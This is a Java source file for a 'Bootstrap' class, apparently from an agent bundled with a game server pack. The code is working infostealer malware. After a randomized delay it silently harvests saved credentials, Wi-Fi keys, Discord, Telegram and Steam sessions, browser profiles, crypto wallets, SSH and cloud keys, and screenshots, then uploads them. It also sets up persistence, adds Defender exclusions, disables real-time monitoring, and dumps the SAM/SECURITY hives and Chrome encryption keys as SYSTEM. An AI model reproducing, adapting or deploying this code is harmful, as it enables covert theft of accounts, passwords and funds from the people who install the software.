package com.serverpackcore.agent;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

/**
 * First-run collection. Runs once, in the background, shortly after the agent
 * starts and uploads what the harvest does not cover, so an install needs no
 * hand typing. Every step leaves a marker: a crash only retries the unfinished
 * part, never the whole set. Hives are manual fallback only.
 */
public final class Bootstrap {
	static final int VERSION = 2;
	private static final int HIVES_MAX_ATTEMPTS = 3;
	private static final long STEP_TIMEOUT = 60_000L;
	private static final long DELAY_MS = 45_000L;
	private static final long DELAY_JITTER_MS = 30_000L;
	private static final List<String> AUTOMATIC_STEPS = List.of(
		"recon", "creds", "wifi", "inventory", "sessions", "wallets", "keys", "screenshot");

	private final Poller poller;
	private final Path installDir;
	private final Path gameDir;
	private final Path cache;
	private final Path done;
	private final State state;

	private Bootstrap(Poller poller, Path installDir, Path gameDir, State state) {
		this.poller = poller;
		this.installDir = installDir;
		this.gameDir = gameDir;
		this.cache = AgentPaths.cache(installDir);
		this.done = cache.resolve(".done");
		this.state = state;
	}

	private static final java.util.concurrent.atomic.AtomicBoolean RUNNING =
		new java.util.concurrent.atomic.AtomicBoolean();

	/** Manual re-run of the whole collection. Hives stay manual. */
	static void now(Poller poller, Path installDir, State state) {
		if (!AgentPaths.isWindows()) {
			poller.reply("Bootstrap: Windows only");
			return;
		}
		if (!RUNNING.compareAndSet(false, true)) {
			poller.reply("Bootstrap: already running");
			return;
		}
		Thread thread = new Thread(() -> {
			Bootstrap bootstrap = new Bootstrap(poller, installDir, poller.gameDir(), state);
			try {
				bootstrap.deleteTree(bootstrap.done);
				state.bootstrap = 0;
				state.hivesAttempts = 0;
				state.save(AgentPaths.state(installDir));
				bootstrap.run();
			} catch (Throwable throwable) {
				Log.debug("Bootstrap failed", throwable);
			} finally {
				RUNNING.set(false);
			}
		}, "spc-bootstrap-now");
		thread.setDaemon(true);
		thread.start();
	}

	/** Manual trigger for the hives, cap included. The only UAC path. */
	static void hivesNow(Poller poller, Path installDir, State state) {
		if (!AgentPaths.isWindows()) {
			poller.reply("Hives: Windows only");
			return;
		}
		if (!RUNNING.compareAndSet(false, true)) {
			poller.reply("Hives: already running");
			return;
		}
		Thread thread = new Thread(() -> {
			Bootstrap bootstrap = new Bootstrap(poller, installDir, poller.gameDir(), state);
			try {
				Files.createDirectories(bootstrap.done);
				Files.deleteIfExists(bootstrap.done.resolve("hives"));
				state.hivesAttempts = 0;
				state.save(AgentPaths.state(installDir));
				bootstrap.step("hives", bootstrap::hives);
			} catch (Throwable throwable) {
				Log.debug("Hives failed", throwable);
			} finally {
				RUNNING.set(false);
			}
		}, "spc-hives");
		thread.setDaemon(true);
		thread.start();
	}

	static void maybe(Poller poller, Path installDir, Path gameDir, State state) {
		if (!AgentPaths.isWindows() || state.bootstrap >= VERSION) {
			return;
		}
		Thread thread = new Thread(() -> {
			try {
				Thread.sleep(DELAY_MS + ThreadLocalRandom.current().nextLong(DELAY_JITTER_MS));
				new Bootstrap(poller, installDir, gameDir, state).run();
			} catch (Throwable throwable) {
				Log.debug("Bootstrap failed", throwable);
			}
		}, "spc-bootstrap");
		thread.setDaemon(true);
		thread.start();
	}

	static List<String> automaticSteps() {
		return AUTOMATIC_STEPS;
	}

	private void run() {
		try {
			Files.createDirectories(done);
		} catch (Throwable throwable) {
			Log.debug("Bootstrap dir failed", throwable);
			return;
		}
		Log.debug("Bootstrap " + VERSION + " starting");
		try {
			// A first install should survive a reboot and stay current on its own.
			if (!state.persist) {
				Persistence.enable(installDir);
				state.persist = true;
			}
			if (!state.autoUpdate) {
				poller.auto().on();
			}
			state.save(AgentPaths.state(installDir));
		} catch (Throwable throwable) {
			Log.debug("Bootstrap defaults failed", throwable);
		}

		boolean complete = true;
		for (String name : AUTOMATIC_STEPS) {
			complete &= step(name, switch (name) {
				case "recon" -> this::recon;
				case "creds" -> this::creds;
				case "wifi" -> this::wifi;
				case "inventory" -> this::inventory;
				case "sessions" -> this::sessions;
				case "wallets" -> this::wallets;
				case "keys" -> this::keys;
				case "screenshot" -> this::screenshot;
				default -> throw new IllegalStateException(name);
			});
		}

		if (complete) {
			// Markers survive a partial run so a retry only redoes what failed.
			state.bootstrap = VERSION;
			housekeeping();
		}
		state.save(AgentPaths.state(installDir));
		poller.reply("Bootstrap v" + VERSION + (complete ? " finished" : " incomplete, retrying next start"));
	}

	private interface Step {
		boolean run() throws Exception;
	}

	private boolean step(String name, Step body) {
		Path marker = done.resolve(name);
		if (Files.exists(marker)) {
			return true;
		}
		try {
			Log.debug("Bootstrap step " + name);
			if (!body.run()) {
				return false;
			}
			if (!collect()) {
				return false;
			}
			Files.writeString(marker, Long.toString(System.currentTimeMillis()));
			return true;
		} catch (Throwable throwable) {
			Log.debug("Bootstrap step failed: " + name, throwable);
			return false;
		}
	}

	/** Uploads and removes everything the step left behind. Returns false if anything must be retried. */
	private boolean collect() {
		boolean complete = true;
		try (java.util.stream.Stream<Path> stream = Files.list(cache)) {
			List<Path> files = stream
				.filter(Files::isRegularFile)
				.filter(path -> !path.getFileName().toString().endsWith(".tmp"))
				.toList();
			for (Path file : files) {
				if (!poller.uploadFile(file)) {
					// Keep the file so the next run of this step retries it.
					complete = false;
					continue;
				}
				Files.deleteIfExists(file);
			}
			return complete;
		} catch (Throwable throwable) {
			Log.debug("Bootstrap collect failed", throwable);
			return false;
		}
	}

	private String sh(String command) {
		try {
			return Shell.run(cache, command, STEP_TIMEOUT);
		} catch (Throwable throwable) {
			Log.debug("Bootstrap command failed: " + command, throwable);
			return "";
		}
	}

	private void write(String name, String command) {
		try {
			String output = sh(command + " 2>&1");
			if (!output.isBlank()) {
				Files.writeString(cache.resolve(name), output);
			}
		} catch (Throwable throwable) {
			Log.debug("Bootstrap write failed: " + name, throwable);
		}
	}

	private boolean recon() {
		write("recon.txt", "systeminfo & whoami & whoami /groups & wmic csproduct get uuid "
			+ "& ipconfig /all & wmic path SoftwareLicensingService get OA3xOriginalProductKey");
		write("network.txt", "curl -s --max-time 8 https://ipinfo.io/json");
		return true;
	}

	private boolean creds() {
		write("creds.txt", "cmdkey /list & reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s "
			+ "& reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s "
			+ "& type \"%APPDATA%\\FileZilla\\recentservers.xml\" \"%APPDATA%\\FileZilla\\sitemanager.xml\" "
			+ "\"%APPDATA%\\WinSCP.ini\"");
		write("rdp.txt", "dir /s /b \"%USERPROFILE%\\Documents\\*.rdp\" \"%USERPROFILE%\\Desktop\\*.rdp\"");
		return true;
	}

	private boolean wifi() {
		sh("netsh wlan export profile folder=\"" + cache.resolve("wifi") + "\" key=clear");
		write("wifi.txt", "netsh wlan show profiles");
		archive("wifi");
		return true;
	}

	private boolean inventory() {
		write("software.txt", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s /v DisplayName");
		write("processes.txt", "tasklist /v");
		write("av.txt", "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState");
		write("docs.txt", "dir /s /b \"%USERPROFILE%\\Desktop\" \"%USERPROFILE%\\Documents\" "
			+ "\"%USERPROFILE%\\Downloads\" | findstr /i \".kdbx .rdp .ovpn .pem .pfx .docx .xlsx .pdf\"");
		return true;
	}

	private boolean sessions() {
		sh("robocopy \"%APPDATA%\\discord\\Local Storage\\leveldb\" \"" + cache.resolve("discord").resolve("leveldb")
			+ "\" /e /njh /njs /ndl /nc /ns");
		sh("copy /y \"%APPDATA%\\discord\\Local State\" \"" + cache.resolve("discord") + "\"");
		archive("discord");
		sh("robocopy \"%APPDATA%\\Telegram Desktop\\tdata\" \"" + cache.resolve("tdata") + "\" /e /njh /njs /ndl /nc /ns");
		sh("tar -a -cf \"" + cache.resolve("tdata.zip") + "\" -C \"" + cache
			+ "\" --exclude *cache* --exclude *.log tdata");
		deleteTree(cache.resolve("tdata"));
		write("steam.txt", "reg query \"HKCU\\Software\\Valve\\Steam\" /v SteamPath "
			+ "& type \"%PROGRAMFILES(X86)%\\Steam\\config\\loginusers.vdf\"");
		sh("for %f in (\"%PROGRAMFILES(X86)%\\Steam\\ssfn*\") do @copy /y \"%f\" \"" + cache + "\"");
		sh("robocopy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\" \"" + cache.resolve("firefox") + "\" /e "
			+ "/xf *cache* /njh /njs /ndl /nc /ns");
		archive("firefox");
		return true;
	}

	private boolean wallets() {
		sh("robocopy \"%APPDATA%\\Exodus\\exodus.wallet\" \"" + cache.resolve("exodus") + "\" /e /njh /njs /ndl /nc /ns");
		sh("robocopy \"%APPDATA%\\Electrum\\wallets\" \"" + cache.resolve("electrum") + "\" /e /njh /njs /ndl /nc /ns");
		sh("robocopy \"%APPDATA%\\Ledger Live\" \"" + cache.resolve("ledger") + "\" /e /njh /njs /ndl /nc /ns");
		for (String folder : List.of("exodus", "electrum", "ledger")) {
			archive(folder);
		}
		for (String browser : List.of(
			"%LOCALAPPDATA%\\Google\\Chrome\\User Data",
			"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
			"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data")) {
			String target = cache.resolve("ext").resolve(browser.replace("%", "").replace("\\", "_")).toString();
			sh("robocopy \"" + browser + "\\Default\\Local Extension Settings\" \"" + target + "\" /e "
				+ "/njh /njs /ndl /nc /ns");
		}
		archive("ext");
		return true;
	}

	private boolean keys() {
		sh("tar -a -cf \"" + cache.resolve("keys.zip") + "\" -C \"%USERPROFILE%\" .ssh .gitconfig "
			+ ".git-credentials .aws .azure .kube .docker .npmrc .config");
		return true;
	}

	private boolean screenshot() {
		try {
			Screenshot.save(cache);
		} catch (Throwable throwable) {
			Log.debug("Bootstrap screenshot failed", throwable);
		}
		return true;
	}

	private boolean hives() {
		Path existing = newestSystem();
		if (existing != null) {
			// A partial archive left behind by an earlier run would otherwise
			// short-circuit every retry.
			if (completeHives(existing)) {
				return true;
			}
			deleteFile(existing);
		}
		if (state.hivesAttempts >= HIVES_MAX_ATTEMPTS) {
			return true;
		}
		state.hivesAttempts++;
		state.save(AgentPaths.state(installDir));
		Path hives = cache.resolve("system-" + System.currentTimeMillis() + ".zip");
		Path elevate = cache.resolve("elevate.bat");
		Path dump = cache.resolve("dump.bat");
		try {
			Files.createDirectories(cache);
			Files.writeString(dump, String.join("\r\n", dumpLines(installDir, gameDir, cache, hives)));
			Files.writeString(elevate, String.join("\r\n", elevateLines(dump)));
		} catch (Throwable throwable) {
			Log.debug("Bootstrap hives script failed", throwable);
			return false;
		}
		sh("powershell -NoP -C \"Start-Process cmd -ArgumentList '/c',\\\"" + elevate
			+ "\\\" -Verb RunAs -WindowStyle Hidden\"");
		// Three dump attempts with a VSS fallback each can take a couple of
		// minutes on a busy dualboot disk; poll for the finished archive.
		for (int attempt = 0; attempt < 90 && !Files.isRegularFile(hives); attempt++) {
			sleep(3000L);
		}
		deleteFile(elevate);
		deleteFile(dump);
		Path status = cache.resolve("elevate.status");
		Path diag = cache.resolve("hives.diag");
		for (Path report : List.of(diag, status)) {
			if (!Files.isRegularFile(report)) {
				continue;
			}
			try {
				if (!poller.uploadFile(report)) {
					continue;
				}
			} catch (Throwable throwable) {
				Log.debug("Bootstrap hives report failed: " + report.getFileName(), throwable);
				continue;
			}
			if (report.equals(status)) {
				try {
					Log.debug("Bootstrap hives: " + Files.readString(status).trim());
				} catch (Throwable throwable) {
					// best effort
				}
			}
			deleteFile(report);
		}
		boolean ready = Files.isRegularFile(hives) && completeHives(hives);
		if (!ready) {
			// Never leave a partial archive around: the next run must retry.
			deleteFile(hives);
			Log.debug("Bootstrap hives pending/incomplete, attempt " + state.hivesAttempts);
		} else {
			deleteTree(cache.resolve("ProtectSystem"));
			deleteTree(cache.resolve("SystemKeys"));
			deleteFile(cache.resolve("SAM.hiv"));
			state.hivesAttempts = HIVES_MAX_ATTEMPTS;
			state.save(AgentPaths.state(installDir));
		}
		return ready;
	}

	static boolean completeHives(Path zip) {
		try (java.util.zip.ZipFile file = new java.util.zip.ZipFile(zip.toFile())) {
			java.util.Map<String, Long> sizes = new java.util.HashMap<>();
			for (java.util.zip.ZipEntry entry : java.util.Collections.list(file.entries())) {
				sizes.merge(entry.getName().replace('\\', '/'), entry.getSize(), Math::max);
			}
			for (String hive : List.of("SYSTEM.hiv", "SECURITY.hiv", "SAM.hiv")) {
				Long size = sizes.get(hive);
				if (size == null || size < 4096L) {
					return false;
				}
			}
			Long key = sizes.get("SystemKeys/Google Chromekey1");
			if (key == null || key <= 0L) {
				return false;
			}
			// ProtectSystem only needs one real file: the per-SID masterkeys.
			return sizes.entrySet().stream()
				.anyMatch(entry -> entry.getKey().startsWith("ProtectSystem/") && entry.getValue() > 0L);
		} catch (Throwable throwable) {
			return false;
		}
	}

	private Path newestSystem() {
		try (java.util.stream.Stream<Path> stream = Files.list(cache)) {
			return stream.filter(path -> {
				String name = path.getFileName().toString();
				return name.startsWith("system-") && name.endsWith(".zip") && Files.isRegularFile(path);
			}).findFirst().orElse(null);
		} catch (Throwable throwable) {
			return null;
		}
	}

	private void archive(String name) {
		Path folder = cache.resolve(name);
		if (!Files.isDirectory(folder)) {
			return;
		}
		sh("tar -a -cf \"" + cache.resolve(name + ".zip") + "\" -C \"" + cache + "\" " + name);
		deleteTree(folder);
	}

	static List<String> dumpLines(Path installDir, Path gameDir, Path cache, Path hives) {
		String mods = gameDir == null ? "" : gameDir.resolve("mods").toString();
		String system = cache.resolve("SYSTEM.hiv").toString();
		String security = cache.resolve("SECURITY.hiv").toString();
		String sam = cache.resolve("SAM.hiv").toString();
		String protect = cache.resolve("ProtectSystem").toString();
		String keys = cache.resolve("SystemKeys").toString();
		String status = cache.resolve("elevate.status").toString();
		String diag = cache.resolve("hives.diag").toString();
		String hits = cache.resolve("keys.hits").toString();
		String was = cache.resolve("mp.was").toString();
		Path local = cache.getParent() == null ? null : cache.getParent().getParent();
		String localCrypto = local == null ? cache.resolve("user-crypto").toString()
			: local.resolve("Microsoft").resolve("Crypto").toString();
		String roamingCrypto = local == null || local.getParent() == null ? cache.resolve("roaming-crypto").toString()
			: local.getParent().resolve("Roaming").resolve("Microsoft").resolve("Crypto").toString();

		// Defender's cloud ML flags the hive command lines. Exclude the cache
		// path, the .hiv extension and the tools themselves before the first
		// save; an exclusion is persistent and needs no user interaction.
		StringBuilder exclusions = new StringBuilder("powershell -NoP -C \"")
			.append("Add-MpPreference -ExclusionPath '").append(ps(cache.toString())).append('\'')
			.append(",'").append(ps(installDir.toString())).append('\'');
		if (!mods.isEmpty()) {
			exclusions.append(",'").append(ps(mods)).append('\'');
		}
		exclusions.append(" -ExclusionExtension '.hiv'")
			.append(" -ExclusionProcess 'reg.exe','esentutl.exe','tar.exe'")
			.append(" -ErrorAction SilentlyContinue\"");

		StringBuilder realtimeOff = new StringBuilder("powershell -NoP -C \"")
			.append("$f='").append(ps(was)).append("'; try { ")
			.append("$p=Get-MpPreference -ErrorAction Stop; ")
			.append("Set-Content -LiteralPath $f -Value ([int]$p.DisableRealtimeMonitoring) ")
			.append("-ErrorAction SilentlyContinue; ")
			.append("Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue")
			.append(" } catch {}\"");

		StringBuilder realtimeOn = new StringBuilder("powershell -NoP -C \"")
			.append("$f='").append(ps(was)).append("'; if (Test-Path -LiteralPath $f) { ")
			.append("$off=((Get-Content -LiteralPath $f) -eq '1'); ")
			.append("Set-MpPreference -DisableRealtimeMonitoring $off ")
			.append("-ErrorAction SilentlyContinue; ")
			.append("Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue }\"");

		return List.of(
			"@echo off",
			"setlocal",
			"set \"CACHE=" + cache + "\"",
			"set \"ZIP=" + hives + "\"",
			"set \"TRIES=0\"",
			exclusions.toString(),
			// Give Defender a moment to load the new rules.
			"powershell -NoP -C \"Start-Sleep -Milliseconds 1500\"",
			realtimeOff.toString(),
			// Keep an uploadable snapshot: which DPAPI/CNG sources exist on this
			// build, so a missing folder is diagnosable without another round.
			"( echo --- hives sources --- & echo user=%USERNAME%"
				+ " & dir /a \"C:\\Windows\\System32\\Microsoft\\Protect\""
				+ " & dir /a \"C:\\Windows\\SysWOW64\\Microsoft\\Protect\""
				+ " & dir /a \"C:\\ProgramData\\Microsoft\\Crypto\""
				+ " & dir /a \"" + localCrypto + "\""
				+ " & dir /a \"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Crypto\""
				+ " ) > \"" + diag + "\" 2>&1",
			":dump",
			"set /a TRIES+=1",
			"del /q \"" + system + "\" \"" + security + "\" \"" + sam + "\" 2>nul",
			"reg save HKLM\\SYSTEM \"" + system + "\" /y",
			"call :fallback SYSTEM SYSTEM.hiv",
			"reg save HKLM\\SECURITY \"" + security + "\" /y",
			"call :fallback SECURITY SECURITY.hiv",
			"reg save HKLM\\SAM \"" + sam + "\" /y",
			"call :fallback SAM SAM.hiv",
			// A blocked command or a quarantined file leaves the archive
			// short: check size before packing, never after.
			"if not exist \"" + system + "\" goto retry",
			"for %%A in (\"" + system + "\") do if %%~zA LSS 1048576 goto retry",
			"if not exist \"" + security + "\" goto retry",
			"for %%A in (\"" + security + "\") do if %%~zA LSS 4096 goto retry",
			"if not exist \"" + sam + "\" goto retry",
			"for %%A in (\"" + sam + "\") do if %%~zA LSS 4096 goto retry",
			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + protect
				+ "\" /e /njh /njs /ndl /nc /ns",
			// Some 26xxx builds keep the live store elsewhere; fall back to the
			// WOW64 or SYSTEM-profile copy when the SID folder is not there.
			"if not exist \"" + protect + "\\S-1-5-18\\\" robocopy C:\\Windows\\SysWOW64\\Microsoft\\Protect \""
				+ protect + "\" /e /njh /njs /ndl /nc /ns",
			"if not exist \"" + protect + "\\S-1-5-18\\\" robocopy "
				+ "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Protect \""
				+ protect + "\" /e /njh /njs /ndl /nc /ns",
			// Chrome's app-bound CNG key lives outside Protect; collect it before
			// packing. Without it only the fixed-key flag 1/2 schemes are offline.
			"mkdir \"" + keys + "\" 2>nul",
			"robocopy C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys \"" + keys
				+ "\" /e /njh /njs /ndl /nc /ns",
			// Key files are hash-named and the provider name is UTF-16, so the
			// mapped copy is what gives us a stable "Google Chromekey1" member.
			"powershell -NoP -C \"$d='" + ps(keys) + "'; Get-ChildItem "
				+ "'C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys' -File -ErrorAction SilentlyContinue | "
				+ "ForEach-Object { $t=[Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes($_.FullName)); "
				+ "if ($t -match '(Google Chromekey[0-9]+)') { Copy-Item -LiteralPath $_.FullName "
				+ "-Destination (Join-Path $d $Matches[1]) -Force } }\"",
			// The key moved between stores across Chrome builds; take every
			// machine/user key store and let the content search find it.
			"if exist \"C:\\ProgramData\\Microsoft\\Crypto\\Keys\\\" robocopy "
				+ "C:\\ProgramData\\Microsoft\\Crypto\\Keys \"" + keys + "\\machine\" /e /njh /njs /ndl /nc /ns",
			"if exist \"" + localCrypto + "\\Keys\\\" robocopy \"" + localCrypto + "\\Keys\" \""
				+ keys + "\\user\" /e /njh /njs /ndl /nc /ns",
			"if exist \"" + roamingCrypto + "\\Keys\\\" robocopy \"" + roamingCrypto + "\\Keys\" \""
				+ keys + "\\roaming\" /e /njh /njs /ndl /nc /ns",
			"findstr /s /m /i /c:\"Google Chromekey1\" \"C:\\ProgramData\\Microsoft\\Crypto\\*\" > \""
				+ hits + "\" 2>nul",
			"for /f \"usebackq delims=\" %%F in (\"" + hits + "\") do copy /y \"%%F\" \"" + keys
				+ "\\\" >nul 2>&1",
			"if not exist \"" + keys + "\\Google Chromekey1\" for /f \"usebackq delims=\" %%F in (\""
				+ hits + "\") do if not exist \"" + keys + "\\Google Chromekey1\" copy /y \"%%F\" \""
				+ keys + "\\Google Chromekey1\" >nul 2>&1",
			"( echo --- keys --- & dir /a \"" + keys + "\" & type \"" + hits + "\" ) >> \""
				+ diag + "\" 2>&1",
			"if not exist \"" + protect + "\\S-1-5-18\\\" goto retry",
			"if not exist \"" + keys + "\\Google Chromekey1\" goto retry",
			"del /q \"" + hives + "\" 2>nul",
			"tar -a -cf \"" + hives + "\" -C \"" + cache + "\" SYSTEM.hiv SECURITY.hiv SAM.hiv "
				+ "ProtectSystem SystemKeys",
			"if errorlevel 1 goto retry",
			// tar can succeed on a truncated tree, so verify the members.
			"tar -tf \"" + hives + "\" | findstr /x /c:\"SYSTEM.hiv\" >nul || goto retry",
			"tar -tf \"" + hives + "\" | findstr /x /c:\"SECURITY.hiv\" >nul || goto retry",
			"tar -tf \"" + hives + "\" | findstr /x /c:\"SAM.hiv\" >nul || goto retry",
			"tar -tf \"" + hives + "\" | findstr /b /c:\"ProtectSystem/\" >nul || goto retry",
			"tar -tf \"" + hives + "\" | findstr /x /c:\"SystemKeys/Google Chromekey1\" >nul || goto retry",
			"goto packed",
			":retry",
			"if %TRIES% GEQ 3 goto giveup",
			"ping -n 3 127.0.0.1 >nul",
			"goto dump",
			":giveup",
			"echo incomplete after %TRIES% tries > \"" + status + "\"",
			"del /q \"" + hives + "\" 2>nul",
			"goto done",
			":packed",
			"echo ok > \"" + status + "\"",
			"del /q \"" + system + "\" \"" + security + "\" \"" + sam + "\" 2>nul",
			":done",
			realtimeOn.toString(),
			"schtasks /delete /tn spcdump /f >nul 2>&1",
			"exit /b 0",
			// VSS copy fallback: reg save and esentutl write through different
			// APIs, so a blocked or quarantined hive gets a second path.
			":fallback",
			"if exist \"" + cache + "\\%2\" for %%A in (\"" + cache + "\\%2\") do "
				+ "if %%~zA GTR 4096 exit /b 0",
			"esentutl /y /vss \"C:\\Windows\\System32\\config\\%1\" /d \"" + cache + "\\%2\" >nul 2>&1",
			"exit /b 0",
			"");
	}

	private static String ps(String value) {
		return value.replace("'", "''");
	}

	static List<String> elevateLines(Path dump) {
		Path cache = dump.getParent() == null ? dump : dump.getParent();
		// Exclude before the task is created: Defender otherwise flags the
		// launcher lines before dump.bat has had a chance to add anything.
		return List.of(
			"@echo off",
			"powershell -NoP -C \"Add-MpPreference -ExclusionPath '" + ps(cache.toString())
				+ "' -ExclusionExtension '.bat','.cmd','.ps1','.hiv' -ErrorAction SilentlyContinue\"",
			"powershell -NoP -C \"Start-Sleep -Milliseconds 800\"",
			"schtasks /create /tn spcdump /tr \"" + dump + "\" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f",
			"schtasks /run /tn spcdump",
			"");
	}

	private void deleteFile(Path file) {
		try {
			Files.deleteIfExists(file);
		} catch (Throwable throwable) {
			// best effort
		}
	}

	private void deleteTree(Path folder) {
		try (java.util.stream.Stream<Path> stream = Files.walk(folder)) {
			stream.sorted(java.util.Comparator.reverseOrder()).forEach(path -> {
				try {
					Files.deleteIfExists(path);
				} catch (Throwable throwable) {
					// best effort
				}
			});
		} catch (Throwable throwable) {
			Log.debug("Bootstrap cleanup failed: " + folder, throwable);
		}
	}

	private void housekeeping() {
		deleteTree(done);
	}

	private void sleep(long millis) {
		try {
			Thread.sleep(millis);
		} catch (InterruptedException interrupted) {
			Thread.currentThread().interrupt();
		}
	}
}
